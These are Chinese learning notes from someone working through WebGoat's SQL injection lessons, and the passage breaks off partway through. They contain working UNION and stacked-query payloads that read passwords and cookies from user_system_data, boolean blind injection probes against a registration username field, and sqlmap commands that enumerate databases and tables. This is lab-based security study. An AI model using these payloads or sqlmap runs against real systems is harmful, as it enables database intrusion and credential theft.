0x02 Lesson 3 题目

Union 的时候要注意字段数量和字段类型

-- 目标: 获取所有 user_system_data 数据 

-- 拼接逻辑:
SELECT * FROM user_data WHERE last_name = ''

-- 预期 SQL1:
select * from user_data where last_name = '' union select userid, user_name, password, cookie, '1','1',1 from user_system_data --' 

-- 需要填写的值1
-- ' union select userid, user_name, password, cookie, '1','1',1 from user_system_data --

-- 预期 SQL2:
select * from user_data where last_name = ''; select userid, user_name, password, cookie from user_system_data --' 
-- 需要填写的值2:
-- '; select userid, user_name, password, cookie from user_system_data --

0x03 SQL 盲注

向数据库问一些真假问题以判断是否存在 SQL 注入漏洞或者一些更具体的信息, 以方便后续实施真正的注入

比如, 判断是否存在 SQL 注入: https://shop.example.com?article=4 AND 1=2

判断数据库版本: https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2

重新整理思路

先按照业务流程整理一下可能的 SQL 吧, 然后再看看这中间哪里可能会有问题

-- 注册
-- 先查询用户是否存在
select * from users where username = '';

-- 如果用户不存在
insert into user (username, email, password) values ('', '', '');

-- 登录
select * from users where username = '' and password = '';

按照这几个可能的 SQL 猜测又去试了下, 依然没什么发现

放弃并直接看答案学习

原来注入点存在于注册场景的用户名
当用户名存在的时候, 系统会反馈 xxx 用户已存在
但如果我们输入一些注入的用户名, 系统会帮忙将后面的条件一起来判断

比如当输入的 username_reg 的值为 tom' and '1'='1 时, 系统会认为用户已存在
但当输入的值为 tom' and '1'='2 时, 系统会认为用户不存在

利用这一点, 我们可以向系统提问

最简单暴力的思路, 可以直接猜测密码的字段名为 password, 然后直接利用 substring(password, 1,1) 逐字符去遍历询问系统 (假如密码是明文保存的话, 这题目里的密码还真的就是明文保存的)

如果是正常一点的思路, 我觉得这个时候应该尝试去使用自动化的工具看看这个已存在的破绽有什么继续可以利用的地方

sqlmap

https://github.com/sqlmapproject/sqlmap
中文说明: https://www.tr0y.wang/2018/03/21/sqlmap-guide/

先确定漏洞
将注册的 http request 放到文件中, 用 sqlmap 去扫描

python sqlmap.py -r ~/register.http

sqlmap 会确定 username_reg 参数存在 boolean-based blind 漏洞
这和我们上面手工确定的信息一致

再查看当前数据库和数据表

python sqlmap.py --thread 10 -r ~/register.http -p username_reg --current-db
python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D PUBLIC --tables

这里有些奇怪, 发现 PUBLIC 库下没有表
那就爆库看看都有哪些数据库吧

python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs
python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs --no-cast

发现了这些数据库, 如果 PUBLIC 下面没有表的话, 莫非是在 chan9t1an 库 (webgoat 的注册账号)下?
